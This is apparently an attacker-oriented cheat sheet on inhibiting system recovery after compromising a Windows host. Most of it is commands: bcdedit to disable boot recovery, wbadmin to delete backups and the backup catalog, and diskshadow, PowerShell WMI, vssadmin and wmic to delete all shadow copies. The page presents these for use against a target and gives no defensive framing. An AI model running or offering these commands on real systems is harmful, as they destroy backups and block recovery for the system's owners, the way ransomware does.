# Inhibit System Recovery

After compromising a target system, we can delete backups or shadow copies to inhibit system recovery.  There are various ways to do that.

## Disable System Recovery

```powershell
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
```

## Delete Backups

- Wbadmin

    ```powershell
    wbadmin delete backup

    # This command deletes Windows Backup Catalog
    wbadmin delete catalog -quiet
    ```

## Delete Shadow Copies

- Diskshadow

    ```powershell
    diskshadow delete shadows all
    ```

- Get-WmiObject

    ```powershell
    Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
    ```

- Vssadmin

    ```powershell
    vssadmin delete shadows /all /quiet
    ```

- Wmic

    ```powershell
    wmic shadowcopy delete
    ```